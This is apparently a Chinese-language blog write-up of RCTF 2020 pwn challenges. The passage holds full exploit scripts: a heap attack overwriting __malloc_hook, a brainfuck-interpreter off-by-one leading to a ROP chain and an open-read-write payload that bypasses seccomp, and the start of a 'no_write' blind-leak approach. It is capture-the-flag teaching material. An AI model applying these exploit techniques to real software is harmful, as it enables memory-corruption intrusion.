class="title">new</span><span class="params">(index, size)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    io.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">once</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'7'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0</span>, <span class="number">21524788884141834</span>)</span><br><span class="line">sell(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">-5</span>,<span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0xfffffffffffffff</span>) + <span class="string">'\x01'</span>)  <span class="comment"># fill money with 0xfffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(i, <span class="number">0x60</span>)</span><br><span class="line">    sell(i)</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'leak_addr: '</span> + hex(leak_addr))</span><br><span class="line"></span><br><span class="line">main_arena = leak_addr - <span class="number">96</span></span><br><span class="line"><span class="comment"># libc_addr = main_arena - 0x3ebc40</span></span><br><span class="line"><span class="comment"># one_gadget = libc_addr + 0x4f322  # 0x4f2c5 0x10a38c</span></span><br><span class="line"></span><br><span class="line">libc_addr = main_arena - <span class="number">0x1e4c40</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'libc: '</span> + hex(libc_addr))</span><br><span class="line">log.info(<span class="string">'malloc_hook: '</span> + hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">fake_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="bf"><a href="#bf" class="headerlink" title="bf"></a>bf</h2><p>一道头秃的c++题目，仔细分析代码可以知道我们输入的code会被当做brainfuck代码解析，随后执行。漏洞点出现在移动指针的操作上。</p><img src="/2020/08/01/2020rctf-some-pwn/1.png"><p>这里退出的条件是指针大于字符串的地址，忽视了等于的时候，所以可以正好读取或者修改字符串的最低字节。而这个最低字节刚好是字符串结构的一个指针它指向存储数据的buf地址，当字符串的长度小于等于16时会把结构体放在栈上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要做的是覆盖这个指针让它指向其他位置，通过再次写入内容可以完成rop chain。在这之后的这道题限制了<code>execve</code>，所以只能使用orw的方法获取flag。</p><h3 id="泄露stack和libc地址"><a href="#泄露stack和libc地址" class="headerlink" title="泄露stack和libc地址"></a>泄露stack和libc地址</h3><p>首先，我们需要泄露出指针的最低位，因为在最后返回的时候需要把指针最低位还原，不然析构函数会报错。</p><p>输入brainfuck的代码<code>,[.&gt;,]&gt;.</code>，其中<code>,</code>读入一字节写入到当前位置，<code>[]</code>类似于循环如果当前位置的数据不为0则会从<code>]</code>跳回<code>[</code>，<code>.</code>输出当前位置的数据，<code>&gt;</code>指针向前移动一个字节。总结来说，这段代码就是可以不断的读输入直到有<code>\x00</code>出现循环退出，再移动一位输出数据。</p><p>输入这段代码之后，我们输入0x3ff的数据末尾跟着<code>\x00</code>，这样就能移动0x400字节大小读取到string的最低字节。在获得最低字节后会判断这个是否符合我们攻击的要求，因为最低字节过大会让后面写入的rop chain超过可控范围。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line"><span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>有了合适的最低字节之后，我们查看栈上有没有可以利用到的数据。</p><img src="/2020/08/01/2020rctf-some-pwn/2.png"><p>在地址<code>0x7ffd464a22d0</code>后面偏移0x20的位置处能看到一个和栈相关的地址，泄露出来我们就能获得栈地址，再往后面看到返回地址处是libc相关的，所以我们再次泄露出返回地址就能得到libc的基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><h3 id="构造ROP-chain执行read"><a href="#构造ROP-chain执行read" class="headerlink" title="构造ROP chain执行read"></a>构造ROP chain执行read</h3><p>首先是找gadget，<code>pop rdi</code>之类的还是很好找的，用工具一下就能出来，但是这个<code>syscall; ret;</code>的gadget用工具没有找到，所以我在libc中开始人工查找，最后发现了<code>get_uid</code>之类的函数，它的整体就只有三句汇编，最后两句就是我们想要的。这里就学到了一点，以后找syscall的gadget直接找<code>get_uid</code>就好了。</p><p>然后是写入数据了，发现一个问题，那就是我们写入数据是利用的之前写brainfuck代码的功能，这个栈空间因为我们输入的代码字符串被破坏，而每次写入的15字节中的前8个字节会被覆盖成我们输入的brainfuck代码，所以这里采用每轮循环会重复写入一段数据来消除这种影响。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">rop_chain = [</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><p>这种输入刚好让rop chain能够覆盖到返回地址，在函数返回之后会读入orw的rop来绕过seccomp的限制。其中比较巧妙的是利用错位和<code>\x00</code>来补位。</p><h3 id="read读入orw获得flag"><a href="#read读入orw获得flag" class="headerlink" title="read读入orw获得flag"></a>read读入orw获得flag</h3><p>剩下的就是构造orw的rop来完成最后的利用，因为我们的上个rop的长度是0x30，而我们的stack是返回地址，所以我们的rop起点是stack+0x30，读入是从stack开始的，所以前面空出的0x30数据段可以填入<code>/flag</code>。</p><p>需要记得在最后退出主函数之前，需要把字符串的指针地址复原。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat([</span><br><span class="line">    p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>整道题比较有趣的地方是那个如何控制好写入rop chain，使用到brainfuck代码来完成持续的写入。通过这道题也了解到C++中string的结构。这里给出官方的exp，完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">6002</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p = remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">"./bf"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># leak low_bit</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">    info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line">    <span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug(0x000000000001C47)</span></span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">    info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">    info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># do rop</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x00000000000a17e0: pop rdi; ret;</span></span><br><span class="line">    <span class="comment"># 0x00000000001306d9: pop rdx; pop rsi; ret;</span></span><br><span class="line">    p_rdi = <span class="number">0x00000000000a17e0</span> + libc.address</span><br><span class="line">    p_rdx_rsi = <span class="number">0x00000000001306d9</span> + libc.address</span><br><span class="line">    ret = <span class="number">0x00000000000d3d8a</span> + libc.address</span><br><span class="line">    p_rax = <span class="number">0x00000000000439c8</span> + libc.address</span><br><span class="line">    syscall_ret = <span class="number">0x00000000000d2975</span> + libc.address  <span class="comment"># d2975!! get uid func</span></span><br><span class="line"></span><br><span class="line">    rop_chain = [</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">        p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">        p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">        p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">        p.send(<span class="string">'y'</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += flat([</span><br><span class="line">        p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">    ])</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># elf = ELF("./bf",checksec=False)</span></span><br><span class="line">    main(args[<span class="string">'REMOTE'</span>])</span><br></pre></td></tr></table></figure><h2 id="no-write"><a href="#no-write" class="headerlink" title="no_write"></a>no_write</h2><p>一道花式rop的栈溢出题目，在ida中看到有prctl，用工具查看它的seccomp设置。</p><img src="/2020/08/01/2020rctf-some-pwn/3.png"><p>发现只能使用<code>open</code>和<code>read</code>两个系统调用，又没有泄露函数。随后查看它的保护措施。</p><img src="/2020/08/01/2020rctf-some-pwn/4.png"><p>开启了<code>full relro</code>不能使用<code>ret2dl_reslove</code>的攻击方法，但是我们有<code>open</code>和<code>read</code>，是可以想方法<code>open ./flag</code>，然后读入我们可控的数据段中。剩下的方法就是怎么把<code>flag</code>泄露出来。</p><p>在看到的wp中有两种思路很类似SQL的盲注思想，一种是基于错误的盲注，在比较中构造一种情况，比较正确和比较错误其中的一种能够引发异常，通过判断异常来逐位爆破比较；另外一种是基于延时的盲注，还是类似的构造出二元情况，通过判断响应时间来逐位爆破比较。我这里使用基于错误的盲注来解决题目。</p><h3 id="构造read读入rop-chain"><a href="#构造read读入rop-chain" class="headerlink" title="构造read读入rop chain"></a>构造read读入rop chain</h3><p>因为没有地址随机化，所以首先想到我们先构造<code>read</code>读入数据到我们可控的地址上，然后转移栈帧执行我们放入的rop chain。这里的rop chain使用了<code>csu_init</code>中的万能调用gadget，把写入数据放在<code>0x601350</code>，方便后续利用，通过gadget也能同时控制<code>rbp</code>，在末尾放置<code>leave ret</code>开启栈转移操作，控制<code>rip</code>指向我们的rop chain。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 